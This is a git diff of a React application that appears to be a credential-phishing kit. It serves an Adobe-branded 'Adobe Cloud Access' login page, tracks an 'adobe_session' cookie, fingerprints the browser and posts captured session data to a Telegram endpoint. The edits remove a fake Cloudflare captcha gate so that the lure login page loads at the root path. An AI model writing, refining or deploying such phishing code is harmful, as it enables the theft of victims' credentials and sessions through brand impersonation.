@@ -4,13 +4,11 @@ import LoginPage from './components/LoginPage';
 import MobileLoginPage from './components/mobile/MobileLoginPage';
 import LandingPage from './components/LandingPage';
 import MobileLandingPage from './components/mobile/MobileLandingPage';
-import CloudflareCaptcha from './components/CloudflareCaptcha';
 import Spinner from './components/common/Spinner';
 import { getBrowserFingerprint } from './utils/oauthHandler';
 import { setCookie, getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
 import { config } from './config';
 
-// This function is unchanged
 const safeSendToTelegram = async (sessionData: any) => {
   try {
     const res = await fetch(config.api.sendTelegramEndpoint, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(sessionData) });
@@ -25,7 +23,6 @@ function App() {
   const [isLoading, setIsLoading] = useState(false);
   const navigate = useNavigate();
 
-  // This effect is unchanged
   useEffect(() => {
     const checkMobile = () => setIsMobile(window.innerWidth <= 768);
     checkMobile();
@@ -33,7 +30,6 @@ function App() {
     return () => window.removeEventListener('resize', checkMobile);
   }, []);
   
-  // This effect now uses navigate() for routing
   useEffect(() => {
     const handleCookieChange = (event: CookieChangeEvent) => {
       if (event.name === 'adobe_session') {
@@ -47,14 +43,10 @@ function App() {
     return unsubscribe;
   }, [navigate]);
 
-  // This effect handles the initial page load
   useEffect(() => {
     if (hasActiveSession) { navigate('/landing', { replace: true }); }
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
-
-  // Your core logic is preserved, but uses navigate()
-  const handleCaptchaVerified = () => navigate('/login');
   
   const handleLoginSuccess = async (loginData: any) => {
     setIsLoading(true);
@@ -85,7 +77,6 @@ function App() {
     config.session.cookieNames.forEach(name => removeCookie(name, { path: '/' }));
   };
 
-  // --- Render Logic ---
   if (isLoading) {
     return <div className="min-h-screen bg-gray-100 flex items-center justify-center"><div className="text-center"><Spinner size="lg" /><p className="text-gray-600 mt-4">Loading...</p></div></div>;
   }
@@ -93,16 +84,13 @@ function App() {
   const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
   const LandingComponent = isMobile ? MobileLandingPage : LandingPage;
 
-  // This defines the pages and their paths for the router
   return (
     <Routes>
-      <Route path="/" element={!hasActiveSession ? <CloudflareCaptcha onVerified={handleCaptchaVerified} /> : <Navigate to="/landing" replace />} />
       <Route 
-        path="/login" 
+        path="/" 
         element={!hasActiveSession ? 
           <LoginComponent 
             fileName="Adobe Cloud Access" 
-            onBack={() => navigate('/')} 
             onLoginSuccess={handleLoginSuccess} 
             onLoginError={e => console.error(e)} 
           /> : 
